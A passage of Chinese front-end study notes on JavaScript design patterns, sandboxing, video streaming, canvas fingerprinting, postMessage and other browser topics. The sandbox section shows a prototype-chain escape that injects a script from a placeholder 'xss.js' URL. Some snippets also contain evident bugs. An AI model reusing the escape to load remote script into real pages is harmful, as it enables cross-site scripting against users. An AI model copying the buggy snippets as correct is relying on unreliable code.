    * 状态模式
    
        对象可以通过管理其状态从而使得应用程序作出相应的变化
        ```js
        class SuperMarry {
            constructor() {
                this._currentState = []
                this.states = {
                    jump() {console.log('跳跃!')},
                    move() {console.log('移动!')},
                    shoot() {console.log('射击!')},
                    squat() {console.log('蹲下!')}
                }
            }
    
            change(arr) {  // 更改当前动作
                this._currentState = arr
                return this
            }
    
            go() {
                console.log('触发动作')
                this._currentState.forEach(T => this.states[T] && this.states[T]())
                return this
            }
        }
    
        new SuperMarry()
            .change(['jump', 'shoot'])
            .go()                    // 触发动作  跳跃!  射击!
            .go()                    // 触发动作  跳跃!  射击!
            .change(['squat'])
            .go()                    // 触发动作  蹲下!
        ```
    
    * 策略模式
    
        将算法的使用和实现分离出来
        ```js
        var calculateBouns = function(salary,level) {
            if(level === 'A') {
                return salary * 4;
            }
            if(level === 'B') {
                return salary * 3;
            }
            if(level === 'C') {
                return salary * 2;
            }
        };
        console.log(calculateBouns(4000,'A')); // 16000
        console.log(calculateBouns(2500,'B')); // 7500
        //↓改为策略模式
        var obj = {
            "A": function(salary) {
                return salary * 4;
            },
            "B" : function(salary) {
                return salary * 3;
            },
            "C" : function(salary) {
                return salary * 2;
            }
        };
        var calculateBouns =function(level,salary) {
            return obj[level](salary);
        };
        console.log(calculateBouns('A',10000)); // 40000
        ```
    
        * 使用条件
    
            1. 各判断条件下的策略相互独立且可复用
            2. 策略内部逻辑相对复杂
            3. 策略需要灵活组合
    
        * 使用场景
    
            1. 权限逻辑
            2. 表单验证
    
        * 例子
    
            ```js
            //以下代码的问题
            //checkAuth 函数会爆炸
            //策略项无法复用
            //违反开闭原则
            function checkAuth(data) {
                if (data.role !== 'juejin') {
                    console.log('不是掘金用户');
                    return false;
                }
                if (data.grade < 1) {
                    console.log('掘金等级小于 1 级');
                    return false;
                }
                if (data.job !== 'FE') {
                    console.log('不是前端开发');
                    return false;
                }
                if (data.type !== 'eat melons') {
                    console.log('不是吃瓜群众');
                    return false;
                }
            }
            ```
    
            修正：策略 + 组合
            ```js
            // 维护权限列表
            const jobList = ['FE', 'BE'];
    
            // 策略
            var strategies = {
                checkRole: function(value) {
                    if (value === 'juejin') {
                        return true;
                    }
                    return false;
                },
                checkGrade: function(value) {
                    if (value >= 1) {
                        return true;
                    }
                    return false;
                },
                checkJob: function(value) {
                    if (jobList.indexOf(value) > 1) {
                        return true;
                    }
                    return false;
                },
                checkEatType: function(value) {
                    if (value === 'eat melons') {
                        return true;
                    }
                    return false;
                }
            };
            // 校验规则
            var Validator = function() {
                this.cache = [];
    
                // 添加策略事件
                this.add = function(value, method) {
                    this.cache.push(function() {
                        return strategies[method](value);
                    });
                };
    
                // 检查
                this.check = function() {
                    for (let i = 0; i < this.cache.length; i++) {
                        let valiFn = this.cache[i];
                        var data = valiFn(); // 开始检查
                        if (!data) {
                            return false;
                        }
                    }
                    return true;
                };
            };
            //验证条件1
            var compose1 = function() {
                var validator = new Validator();
                const data1 = {
                    role: 'juejin',
                    grade: 3
                };
                validator.add(data1.role, 'checkRole');
                validator.add(data1.grade, 'checkGrade');
                const result = validator.check();
                return result;
            };
            //验证条件2
            var compose2 = function() {
                var validator = new Validator();
                const data2 = {
                    role: 'juejin',
                    job: 'FE'
                };
                validator.add(data2.role, 'checkRole');
                validator.add(data2.job, 'checkJob');
                const result = validator.check();
                return result;
            };
            ```
    
    * 模板方法模式
    
        抽取共同点作为抽象父类，再具体实现一系列子类
        ```js
        var Interview = function(){};
        Interview.prototype.writtenTest = function(){
            console.log("笔试");
        };
        Interview.prototype.technicalInterview = function(){
            console.log("技术面试");
        };
        Interview.prototype.leader = function(){
            console.log("leader面试");
        };
        Interview.prototype.waitNotice = function(){
            console.log("等待通知");
        };
        Interview.prototype.init = function(){
            this.writtenTest();
            this.technicalInterview();
            this.leader();
            this.waitNotice();
        };
        var AInterview = function(){};
        AInterview.prototype = new Interview();
        AInterview.prototype.writtenTest = function(){
            console.log("笔试a");
        }
        AInterview.prototype.technicalInterview = function(){
            console.log("技术面试a");
        }
        AInterview.prototype.leader = function(){
            console.log("leader面试a");
        }
        AInterview.prototype.waitNotice = function(){
            console.log("等待通知a");
        }
        var aInterview = new BaiDuInterview();
        AInterview.init();
        ```
    
    * 访问者模式
    
        在不改变该对象的前提下访问其结构中元素的新方法
        ```js
        var Visitor = (function() {
            return {
                splice: function(){
                    var args = Array.prototype.splice.call(arguments, 1)
                    return Array.prototype.splice.apply(arguments[0], args)
                },
                push: function(){
                    var len = arguments[0].length || 0
                    var args = this.splice(arguments, 1)
                    arguments[0].length = len + arguments.length - 1
                    return Array.prototype.push.apply(arguments[0], args)
                },
                pop: function(){
                    return Array.prototype.pop.apply(arguments[0])
                }
            }
        })()
    
        var a = new Object()
        console.log(a.length)
        Visitor.push(a, 1, 2, 3, 4)
        console.log(a.length)
        Visitor.push(a, 4, 5, 6)
        console.log(a.length)
        Visitor.pop(a)
        console.log(a)
        console.log(a.length)
        Visitor.splice(a, 2)
        console.log(a)
        ```

    * 沙箱模式

      * 概念

        沙箱就是让你的程序跑在一个隔离的环境下，不对外界的其他程序造成影响，Chrome 中的每一个标签页都是一个沙箱（sandbox）。渲染进程被沙箱（Sandbox）隔离，网页 web 代码内容必须通过 IPC 通道才能与浏览器内核进程通信，通信过程会进行安全的检查。沙箱设计的目的是为了让不可信的代码运行在一定的环境中，从而限制这些代码访问隔离区之外的资源。

      * 使用场景

        1. jsonp：如果不信任jsonp中的数据，可以通过创建沙箱的方式来解析获取数据
        2. 执行第三方js
        3. 在线代码编辑器
        4. vue的服务端渲染：vue的服务端渲染实现中，通过创建沙箱执行前端的bundle文件
        5. vue模板中表达式计算：vue模板中表达式的计算被放在沙盒中，只能访问全局变量Math 和 Date

      * 实现沙箱

        1. proxy(不安全)

          ```js
          function compileCode (src) {  
            src = `with (exposeObj) { ${src} }`
            return new Function('exposeObj', src)
          }

          function proxyObj(originObj){
              let exposeObj = new Proxy(originObj,{
                  has:(target,key)=>{
                      if(["console","Math","Date"].indexOf(key)>=0){
                          return target[key]
                      }
                      if(!target.hasOwnProperty(key)){
                          throw new Error(`Illegal operation for key ${key}`)
                      }
                      return target[key]
                  },
              })
              return exposeObj
          }

          function createSandbox(src,obj){
            let proxy = proxyObj(obj)
            compileCode(src).call(proxy,proxy) //绑定this 防止this访问window
          }
          ```

          通过访问原型链的方式，实现了沙箱逃逸
          ```js
          const testObj = {
              value:1,
              a:{
                  b:{c:1}
              }
          }
          createSandbox("value='haha';console.log(a)",testObj)
          a.b.__proto__.toString = ()=>{
              var script = document.createElement("script");
              script.src = "http://.../xss.js"
              script.type = "text/javascript";
              document.body.appendChild(script)
          }
          ```

        2. iframe

          ```html
          <iframe sandbox src="..."></iframe>
          ```

          会带来一些限制：

          1. script脚本不能执行
          2. 不能发送ajax请求
          3. 不能使用本地存储，即localStorage,cookie等
          4. 不能创建新的弹窗和window
          5. 不能发送表单
          6. 不能加载额外插件比如flash等

          可对iframe配置：

          1. allow-forms:允许提交表单
          2. allow-scripts:允许执行脚本
          3. allow-same-origin:允许同域请求
          4. allow-top-navigation:允许window.top跳转页面
          5. allow-popups:允许弹出新窗口，window.open，target="_blank"
          6. allow-pointer-lock:允许锁定鼠标

        3. 其它

          ```js
          //SandBox(['module1,module2'],function(box){});
          /*
          *
          *
          * @function
          * @constructor
          * @param []  array   模块名数组
          * @param callback function 回调函数
          * 功能：新建一块可用于模块运行的环境(沙箱)，自己的代码放在回调函数里，且不会对其他的个人沙箱造成影响
          和js模块模式配合的天衣无缝
          *
          * */
          function SandBox() {
            //私有的变量
            var args = Array.prototype.slice.call(arguments),
                callback = args.pop(),
                //模块可以作为一个数组传递，或作为单独的参数传递
                modules = (args && typeof args[0] == "string") ? args : args[0];
            //确保该函数作为构造函数调用
            if (!(this instanceof SandBox)) {
              return new SandBox(modules,callback);
            }
            //不指定模块名和“*”都表示“使用所有模块”
            if (!modules || modules[0] === "*") {
              for(value in SandBox.modules){
                modules.push(value);
              }
            }
            //初始化所需要的模块（将想要的模块方法添加到box对象上）
              for (var i = 0; i < modules.length; i++) {
                SandBox.modules[modules[i]](this);
              }
            //自己的代码写在回调函数里，this就是拥有指定模块功能的box对象
            callback(this);
          }
          SandBox.prototype={
            name:"My Application",
            version:"1.0",
            getName:function() {
              return this.name;
            }
          };
          /*
          * 预定义的模块
          *
          * */
          SandBox.modules={};
          SandBox.modules.event=function(box){
            //私有属性
            var xx="xxx";
            //公共方法
            box.attachEvent=function(){
              console.log("modules:event------API:attachEvent")
            };
            box.dettachEvent=function(){
            };
          }
          SandBox.modules.ajax=function(box) {
            var xx = "xxx";
            box.makeRequest = function () {
            };
            box.getResponse = function () {
            };
          }
          SandBox(['event','ajax'],function(box){
            box.attachEvent();
          })
          ```

      * nodejs沙箱

        1. vm

          缺陷：可以通过vm，停止掉主进程nodejs，导致程序不能继续往下执行
          ```js
          const vm = require('vm');
          const x = 1;
          const sandbox = { x: 2 };
          vm.createContext(sandbox); // Contextify the sandbox.

          const code = 'x += 40; var y = 17;';
          vm.runInContext(code, sandbox);

          console.log(sandbox.x); // 42
          console.log(sandbox.y); // 17

          console.log(x); // 1;   y is not defined.
          ```

        2. tsw框架

          ```js
          const vm = require('vm');
          const SbFunction = vm.runInNewContext('(Function)', Object.create(null));        // 沙堆
          ...
          if (opt.jsonpCallback) {
              code = `var result=null; var ${opt.jsonpCallback}=function($1){result=$1}; ${responseText}; return result;`;
              obj = new SbFunction(code)();
          } 
          ...
          ```


### 发布订阅和观察者

1. 参考链接

   [观察者模式（Observer）和发布（Publish/订阅模式（Subscribe）的区别](https://blog.csdn.net/qq_39877296/article/details/79103206)

   [vue 发布订阅者模式$emit、$on](https://blog.csdn.net/qq_42778001/article/details/96692000)

2. 详解

   - 观察者模式

     观察者注入被观察目标，被观察目标数据变化，通知观察者更新

   - 发布、订阅模式

     订阅者订阅(注入)调度中心，发布者发布事件到调度中心，调度中心调用订阅者方法

     ```js
     function Center() {
       this.subscriptionCenter = {};
     }
     //on和emit都是公共方法
     Center.prototype.on = function (eventName, callback) {
       if (this.subscriptionCenter[eventName]) {
         this.subscriptionCenter[eventName].push(callback);
       } else {
         this.subscriptionCenter[eventName] = [callback];
       }
     };
     Center.prototype.emit = function (eventName, ...publishInfo) {
       if (this.subscriptionCenter[eventName]) {
         this.subscriptionCenter[eventName].forEach((cb) => cb(...publishInfo));
       }
     };
     var center = new Center();
     center.on("subscription", function event1(time) {
       console.log("event1");
     });
     center.on("subscription", function event2(time) {
       console.log("event2");
     });
     center.on("subscription", function event3(time) {
       console.log("event3");
     });
     center.emit("subscription", "hello");
     ```

### 实现链式调用

1. 参考链接

   [JS 如何实现链式调用](https://www.jianshu.com/p/c097d75b526a)

2. 详解

   方法链，当方法的返回值是一个对象，这个对象就可以继续调用它的方法。一般当函数不需要返回值时，直接 return this，余下的方法就可以基于此继续调用。

   ```js
   var obj = {};
   obj.a = function () {
     console.log("a");
     return this;
   };
   obj.b = function () {
     console.log("b");
     return this;
   };
   obj.c = function () {
     console.log("c");
     console.log(this);
     return this;
   };
   obj.a().b().c();
   ```

### video深入理解

1.  参考链接：

  [「1.4万字」玩转前端 Video 播放器 | 多图预警](https://juejin.im/post/5f0e52fe518825742109d9ee#heading-4)

  [hls.js](https://github.com/video-dev/hls.js)

  [video-hls-encrypt](https://github.com/hauk0101/video-hls-encrypt)

  [flv.js](https://github.com/Bilibili/flv.js/)

  [MediaSource](https://developer.mozilla.org/zh-CN/docs/Web/API/MediaSource)

2.  详解

  * range从服务器端请求特定的范围

    * 单一范围

      request添加header“Range:bytes=0-1023”，服务端返回响应码206 Partial Content，响应Content-Length表示请求范围，响应Content-Range内容在整个资源中所处的位置

    * 多重范围

      request添加“Range: bytes=0-50, 100-150”，会产生2部分的单一范围响应

    * 条件式范围请求

      当重新开始请求更多资源片段的时候，必须确保自从上一个片段被接收之后该资源没有进行过修改。

      If-Range请求首部可以用来生成条件式范围请求：

      请求条件满足：返回状态码为 206 Partial 的响应，以及相应的消息主体

      请求条件不满足：返回状态码为 「200 OK」 的响应，同时返回整个资源

      请求范围越界：返回 416 Requested Range Not Satisfiable 请求的范围无法满足

      If-Range可以与 Last-Modified 或者 ETag 一起使用，但是二者不能同时使用

  * 流媒体

    * 流媒体协议

      ```txt
      HTTP+FLV TCP 用于直播/点播，兼容性好，低延时，保密性不强
      HLS TCP 用于点播，apple支持度高，移动端兼容性好，延时高
      RTMP TCP 用于直播，adobe支持度高，低延迟，有累积延迟
      RTMFP TCP 用于直播，带宽消耗低，数据传输速率高，需flash支持
      RTSP+RTP TCP+UDP 用于IPTV，支持组播，效率较高，存在丢包问题，浏览器不支持
      ```

      * HLS

        HTTP Live Streaming，工作原理是把整个流分成一个个小的基于 HTTP 的文件来下载。

        HLS 是一种自适应比特率流协议，可以动态地使视频分辨率自适应每个人的网络状况。当媒体流正在播放时，客户端可以选择从许多不同的备用源中以不同的速率下载同样的资源，允许流媒体会话适应不同的数据速率。

        HLS 的传输/封装格式是 MPEG-2 TS（MPEG-2 Transport Stream），是一种传输和存储包含视频、音频与通信协议各种数据的标准格式，用于数字电视广播系统，如 DVB、ATSC、IPTV 等等。

        可以把多个 TS 文件合并为 mp4 格式的视频文件。视频版权保护，可以考虑使用对称加密算法，如 AES-128 对切片进行对称加密。当客户端进行播放时，先根据 m3u8 文件中配置的密钥服务器地址，获取对称加密的密钥，然后再下载分片，当分片下载完成后再使用匹配的对称加密算法进行解密播放。demo见参考链接3。

        * 特性

          * HLS 将播放使用 H.264 或 HEVC / H.265 编解码器编码的视频。
          * HLS 将播放使用 AAC 或 MP3 编解码器编码的音频。
          * HLS 视频流一般被切成 10 秒的片段。
          * HLS 的传输/封装格式是 MPEG-2 TS。
          * HLS 支持 DRM（数字版权管理）。
          * HLS 支持各种广告标准，例如 VAST 和 VPAID。

      * DASH

        Dynamic Adaptive Streaming over HTTP，基于 HTTP 的动态自适应流，一种自适应比特率流技术，使高质量流媒体可以通过传统的 HTTP 网络服务器以互联网传递。

        当内容被 MPEG-DASH 客户端回放时，客户端将根据当前网络条件自动选择下载和播放哪一个备选方案。客户端将选择可及时下载的最高比特率片段进行播放，从而避免播放卡顿或重新缓冲事件。

        DASH 不关心编解码器，因此它可以接受任何编码格式编码的内容，如 H.265、H.264、VP9 等。

        HTML5 不直接支持 MPEG-DASH，通常用于视频播放器(字节跳动-西瓜视频)。

      * FLV

        FLASH Video，文件极小、加载速度极快

        ![flv结构](./flv.png)

        flv.js见参考链接4

        * 特性

          * 支持播放 H.264 + AAC / MP3 编码的 FLV 文件；
          * 支持播放多段分段视频；支持播放 HTTP FLV 低延迟实时流；
          * 支持播放基于 WebSocket 传输的 FLV 实时流；
          * 兼容 Chrome，FireFox，Safari 10，IE11 和 Edge；
          * 极低的开销，支持浏览器的硬件加速。

        * 限制

          * MP3 音频编解码器无法在 IE11/Edge 上运行；
          * HTTP FLV 直播流不支持所有的浏览器。

        * 使用

          ```html
          <script src="flv.min.js"></script>
          <video id="videoElement"></video>
          <script>
              if (flvjs.isSupported()) {
                  var videoElement = document.getElementById('videoElement');
                  var flvPlayer = flvjs.createPlayer({
                      type: 'flv',
                      url: 'http://example.com/flv/video.flv'
                  });
                  flvPlayer.attachMediaElement(videoElement);
                  flvPlayer.load();
                  flvPlayer.play();
              }
          </script>
          ```

        * 工作原理

          将 FLV 文件流转换为 ISO BMFF（Fragmented MP4）片段，然后通过 Media Source Extensions API 将 mp4 段给 HTML5 video

      * MSE API

        媒体源扩展 API（Media Source Extensions） 提供了实现无插件且基于 Web 的流媒体的功能。使用 MSE，媒体串流能够通过 JavaScript 创建，并且能通过使用 audio 和 video 元素进行播放。

        MSE 使我们可以把通常的单个媒体文件的 src 值替换成引用 MediaSource 对象（一个包含即将播放的媒体文件的准备状态等信息的容器），以及引用多个 SourceBuffer 对象（代表多个组成整个串流的不同媒体块）的元素。

        使用方法见参考链接1或参考链接5

    * 多媒体封装格式

      * 封装格式

        AVI、RMVB、MKV、ASF、WMV、MP4、3GP、FLV

      * 视频编码格式

        H.264，HEVC，VP9 和 AV1

      * 音频编码格式

        MP3、AAC 和 Opus

      * 多媒体容器

        MP4，MOV，TS，FLV，MKV

      * 视频播放基本处理流程

        1. 解协议

          从原始的流媒体协议数据中删除信令数据，只保留音视频数据，如采用 RTMP 协议传输的数据，经过解协议后输出 flv 格式的数据。

        2. 解封装

          例如 FLV 格式的数据经过解封装后输出 H.264 编码的视频码流和 AAC 编码的音频码流。

        3. 解码

          视频，音频压缩编码数据，还原成非压缩的视频，音频原始数据，音频的压缩编码标准包括 AAC，MP3，AC-3 等，视频压缩编码标准包含 H.264，MPEG2，VC-1 等经过解码得到非压缩的视频颜色数据如 YUV420P，RGB 和非压缩的音频数据如 PCM 等。
          
        4. 音视频同步

          将同步解码出来的音频和视频数据分别送至系统声卡和显卡播放。

  * 视频本地预览

    URL.createObjectURL()
    ```html
    <!DOCTYPE html>
    <html>
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>视频本地预览示例</title>
      </head>
      <body>
        <h3>视频本地预览示例</h3>
        <input type="file" accept="video/*" onchange="loadFile(event)" />
        <video
          id="previewContainer"
          controls
          width="480"
          height="270"
          style="display: none;"
        ></video>

        <script>
          const loadFile = function (event) {
            const reader = new FileReader();
            reader.onload = function () {
              const output = document.querySelector("#previewContainer");
              output.style.display = "block";
              output.src = URL.createObjectURL(new Blob([reader.result]));
            };
            reader.readAsArrayBuffer(event.target.files[0]);
          };
        </script>
      </body>
    </html>
    ```

  * 播放器截图

    CanvasRenderingContext2D.drawImage()
    ```html
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>播放器截图示例</title>
      </head>
      <body>
        <h3>播放器截图示例</h3>
        <video id="video" controls="controls" width="460" height="270" crossorigin="anonymous">
          <!-- 请替换为实际视频地址 -->
          <source src="https://xxx.com/vid_159411468092581" />
        </video>
        <button onclick="captureVideo()">截图</button>
        <script>
          let video = document.querySelector("#video");
          let canvas = document.createElement("canvas");
          let img = document.createElement("img");
          img.crossOrigin = "";
          let ctx = canvas.getContext("2d");

          function captureVideo() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            img.src = canvas.toDataURL();
            document.body.append(img);
          }
        </script>
      </body>
    </html>
    ```

  * Canvas 播放视频

    开发者可以动态地更改每一帧图像的显示内容，如加入弹幕

    ctx.drawImage(video, x, y, width, height)
    ```html
    <!DOCTYPE html>
    <html>
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>使用 Canvas 播放视频</title>
      </head>
      <body>
        <h3>使用 Canvas 播放视频</h3>
        <video id="video" controls="controls" style="display: none;">
          <!-- 请替换为实际视频地址 -->
          <source src="https://xxx.com/vid_159411468092581" />
        </video>
        <canvas
          id="myCanvas"
          width="460"
          height="270"
          style="border: 1px solid blue;"
        ></canvas>
        <div>
          <button id="playBtn">播放</button>
          <button id="pauseBtn">暂停</button>
        </div>
        <script>
          const video = document.querySelector("#video");
          const canvas = document.querySelector("#myCanvas");
          const playBtn = document.querySelector("#playBtn");
          const pauseBtn = document.querySelector("#pauseBtn");
          const context = canvas.getContext("2d");
          let timerId = null;

          function draw() {
            if (video.paused || video.ended) return;
            context.clearRect(0, 0, canvas.width, canvas.height);
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            timerId = setTimeout(draw, 0);
          }

          playBtn.addEventListener("click", () => {
            if (!video.paused) return;
            video.play();
            draw();
          });

          pauseBtn.addEventListener("click", () => {
            if (video.paused) return;
            video.pause();
            clearTimeout(timerId);
          });
        </script>
      </body>
    </html>
    ```

  * 色度键控（绿屏效果）

    把被拍摄的人物或物体放置于绿幕的前面，并进行去背后，将其替换成其他的背景。此技术在电影、电视剧及游戏制作中被大量使用，色键也是虚拟摄影棚（Virtual studio）与视觉效果（Visual effects）当中的一个重要环节。

    ```js
    processor.computeFrame = function computeFrame() {
        this.ctx1.drawImage(this.video, 0, 0, this.width, this.height);
        let frame = this.ctx1.getImageData(0, 0, this.width, this.height);
        let l = frame.data.length / 4;

        for (let i = 0; i < l; i++) {
          let r = frame.data[i * 4 + 0];
          let g = frame.data[i * 4 + 1];
          let b = frame.data[i * 4 + 2];
          if (g > 100 && r > 100 && b < 43)
            frame.data[i * 4 + 3] = 0;
        }
        this.ctx2.putImageData(frame, 0, 0);
        return;
    }
    ```

### 获取浏览器的唯一标识

1.  参考链接：

  [几个常见面试题，工作中也经常用到](https://mp.weixin.qq.com/s/IvWGkm5pn3vjbLUB-SvXkQ)

2.  详解

  由于不同的系统显卡绘制 canvas 时渲染参数、抗锯齿等算法不同，因此绘制成图片数据的 CRC 校验也不一样。

  绘制 canvas，获取 base64 的 dataurl,对 dataurl 这个字符串进行 md5 摘要计算，得到指纹信息。
  ```js
  function getCanvasFp () {
    const canvas = document.getElementById('canvas')
    const ctx = canvas.getContext('2d')
    ctx.font = '14px Arial'
    ctx.fillStyle = '#ccc'
    ctx.fillText('hello, shanyue', 2, 2)
    return canvas.toDataURL('image/jpeg')
  }
  ```

  可使用fingerprintjs2库,指纹依据信息:canvas/webgl/UserAgent/AudioContext/新式 API 的支持程度
  ```js
  requestIdleCallback(function () {
    Fingerprint2.get((components) => {
      const values = components.map((component) => component.value)
      const fp = Fingerprint2.x64hash128(values.join(''), 31)
    })
  })
  ```
  browser independent component：有些 component 同一设备跨浏览器也可以得到相同的值，有些独立浏览器，得到不同的值
  stable component: 有些 component 刷新后值就会发生变化，称为不稳定组件


### 跨源通信

1. 参考链接：

  [window.postMessage](https://developer.mozilla.org/zh-CN/docs/Web/API/Window/postMessage)

2. 详解

* 与app通信
  ```js
  isAndroid() {
      return window.navigator.userAgent.indexOf('Android') > -1 || window.navigator.userAgent.indexOf('Adr') > -1;
  }
  isIOS() {
      return !!window.navigator.userAgent.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
  }
  try{
      //myFunction为约定的函数名
      if (this.isAndroid()) {
          window.android.myFunction(this.state.data);
      }
      if (this.isIOS()) {
          window.webkit.messageHandlers.myFunction.postMessage(this.state.data);
      }
  }
  catch(e){
      //console.log(e)
  }
  ```

* 跨源通信

  window.postMessage() 方法可以安全地实现跨源通信。

  通常，对于两个不同页面的脚本，只有当执行它们同源时，这两个脚本才能相互通信。window.postMessage() 方法提供了一种受控机制来规避此限制，只要正确的使用，这种方法就很安全。

  兼容性:IE10+

  用法
  ```js
  otherWindow.postMessage(message, targetOrigin, [transfer]);
  ```
  * otherWindow:其他窗口的一个引用,如iframe.contentWindow或window.opener
  * message:数据会自动序列化
  * targetOrigin:"*"（表示无限制）或者一个URI,如果你明确的知道消息应该发送到哪个窗口，那么请始终提供一个有确切值的targetOrigin，而不是\*。不提供确切的目标将导致数据泄露到任何对数据感兴趣的恶意站点。
  * transfer:可选,是一串和message 同时传递的 Transferable 对象. 这些对象的所有权将被转移给消息的接收方，而发送一方将不再保有所有权。

  样例
  ```js
  /*
  * A窗口的域名是<http://example.com:8080>，以下是A窗口的script标签下的代码：
  */

  var popup = window.open(...popup details...);

  // 如果弹出框没有被阻止且加载完成

  // 这行语句没有发送信息出去，即使假设当前页面没有改变location（因为targetOrigin设置不对）
  popup.postMessage("The user is 'bob' and the password is 'secret'", "https://secure.example.net");

  // 假设当前页面没有改变location，这条语句会成功添加message到发送队列中去（targetOrigin设置对了）
  popup.postMessage("hello there!", "http://example.org");

  function receiveMessage(event)
  {
    // 我们能相信信息的发送者吗?  (也许这个发送者和我们最初打开的不是同一个页面).
    if (event.origin !== "http://example.org") return;

    // event.source 是我们通过window.open打开的弹出页面 popup
    // event.data 是 popup发送给当前页面的消息 "hi there yourself!  the secret response is: rheeeeet!"
  }
  window.addEventListener("message", receiveMessage, false);


  /*
  * 弹出页 popup 域名是<http://example.org>，以下是script标签中的代码:
  */

  //当A页面postMessage被调用后，这个function被addEventListener调用
  function receiveMessage(event)
  {
    // 我们能信任信息来源吗？
    if (event.origin !== "http://example.com:8080") return;

    // event.source 就当前弹出页的来源页面
    // event.data 是 "hello there!"

    // 假设你已经验证了所受到信息的origin (任何时候你都应该这样做), 一个很方便的方式就是把event.source
    // 作为回信的对象，并且把event.origin作为targetOrigin
    event.source.postMessage("hi there yourself!  the secret response is: rheeeeet!", event.origin);
  }

  window.addEventListener("message", receiveMessage, false);
  ```

### ChromeBug:FontBoosting

1. 参考链接：

  [Font Boosting](http://www.360doc.com/content/16/0224/12/19291760_536900294.shtml)

  [flexible.js字体大小诡异现象解析及解决方案](https://www.cnblogs.com/axl234/p/5895347.html)

2. 详解

  * 情景

    在dpr为2和3时，原本指定的字体大小是24px，但是最终计算出来的却是53px

  * 原因

    当页面中的标签数量或者文本数量大于某一个值，或者当CSS定义的字体大小落在某个区间时，这个问题才会被触发。而且字体变大后的值也随着原始定义的字体大小而改变。

  * Font Boosting

    Webkit 给移动端浏览器提供的一个特性：当我们在手机上浏览网页时，很可能因为原始页面宽度较大，在手机屏幕上缩小后就看不清其中的文字了。而 Font Boosting 特性在这时会自动将其中的文字字体变大，保证在即不需要左右滑动屏幕，也不需要双击放大屏幕内容的前提下，也可以让人们方便的阅读页面中的文本。

    * 触发条件

      1. viewport width设为默认值
      2. 未给文本元素指定宽高，可通过加max-height解决，比如body * { max-height: 999999px; }
      3. WebKit 中应该有判断如果initial-scale=1时，不触发Font Boosting，可设置如下代码

        ```html
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- 或 -->
        <meta name ="viewport" content ="initial-scale=1, maximum-scale=1, minimum-scale=1">
        ```

    * 实现

      ```C++
      multiplier = Math.max(1, deviceScaleAdjustment * textScalingSlider * systemFontScale * clusterWidth / screenWidth);
      if (originFontSize < 16) {
          computedFontSize = originFontSize * multiplier;
      }
      else if (16 <= originFontSize <= (32 * multiplier - 16)) {
          computedFontSize = (originFontSize / 2) + (16 * multiplier - 8);
      }
      else if (originFontSize > (32 * multiplier - 16)) {
          computedFontSize = originFontSize;
      }
      ```

    * 更多讨论

    [Webkit Bug 84186](https://bugs.webkit.org/show_bug.cgi?id=FontBoosting) Webkit Bugs 上记录的这个问题，最早从 2012 年 4 月份就开始讨论这个问题了，但好像都没有引起我们的任何关注。
    [Chromium's Text Autosizer](https://docs.google.com/document/d/1PPcEwAhXJJ1TQShor29KWB17KJJq7UJOM34oHwYP3Zg) 关于 Font Boosting 最重要的一篇文章，更确切的说是论文。
    [Font boosting in mobile browsers](http://sysmagazine.com/posts/214559/)
    [Font Boosting](http://www.patrickcatanzariti.com/2013/03/font-boosting/) 一个俄国人用英文写的文章。

### swiper轮播

1. 参考链接：

  [Swiper](https://www.swiper.com.cn/)

  [关于Swiper](https://www.swiper.com.cn/about/us/)

2. 详解

  * swiper2

    移动机制：transform或left/top

    一般布局，wrapper宽度为slide总和

    IE7+，部分移动端，IE7需引入JQuery

    Smooth Progress插件

    Swiper 3D flow插件

    Scrollbar插件

    滑动方向 mode

    free模式动量 momentumRatio

    偏移量 offsetPxBefore

    3d流 tdFlow插件

    导航按钮 swipePrev、swipeNext

    Slide跳转函数 swipeTo、swipePrev、swipeNext

  * swiper3

    移动机制：transform

    flex或一般布局，wrapper宽度为第一个slide

    移动端浏览器、部分PC端浏览器

    fade 渐变

    cube 方块

    coverflow 移动翻转

    flip 翻转

    滑动方向 direction

    free模式动量 freeModeMomentumRatio

    偏移量 slidesOffsetBefore

    3d流 coverflow

    导航按钮 prevButton、nextButton

    Slide跳转函数 slideTo、slidePrev、slideNext

    禁止滑动onlyExternal: true

  * swiper4

    移动机制：transform

    flex或一般布局，wrapper宽度为第一个slide

    移动端浏览器、部分PC端浏览器、IE10+

    Navigation 分页器

    Pagination 按钮

    Scrollbar 滚动条

    Autoplay 自动切换

    Lazy Loading 延迟加载图片

    Fade Effect 渐变过渡

    Coverflow Effect 行进翻转过渡

    Flip Effect 翻转过渡

    Cube Effect 方块过渡

    Zoom 缩放

    Keyboard Control 键盘

    Mousewheel Control 鼠标

    Virtual Slides 虚拟块

    Hash Navigation 锚导航

    History Navigation 历史导航

    Controller 相互控制

    Accessibility 障碍使用辅助

    禁止滑动allowTouchMove: false

  * swiper5

    Swiper5 增加了CSS模式（cssMode），并且可以通过CSS文件修改Swiper颜色风格。

    不再全面支持IE

  * swiper6

    不再全面支持IE

    新增swiper的React、Svelte、Vue.js版本，作为前端框架的组件使用

  * swiper7

    不再全面支持IE

    Swiper默认容器由.swiper-container改为.swiper

### 腾讯位置服务汽车轨迹

1. 参考链接：

  [使用腾讯位置服务实现汽车沿轨迹行驶功能](https://juejin.cn/post/6967159990734094343)

  [腾讯位置服务个性化图层创建及发布](https://juejin.cn/post/6967189715569082376)

  [腾讯位置服务-JavaScript API GL](https://lbs.qq.com/webDemoCenter/glAPI/glMap/createMap)

  [腾讯位置服务-参考手册](https://lbs.qq.com/webApi/javascriptGL/glDoc/glDocIndex)

  [腾讯位置服务-个性化地图](https://lbs.qq.com/dev/console/custom/mapStyle)

2. 详解

  进入腾讯位置服务页面然后进行注册账号，注册完成后需要申请[AppKey](https://lbs.qq.com/dev/console/application/mine)，我们将在自己的应用中配置这个Key来使用SDK中的服务。
  ```html
  <!DOCTYPE html>
  <html lang="en">

  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>marker轨迹回放-全局模式</title>
  </head>
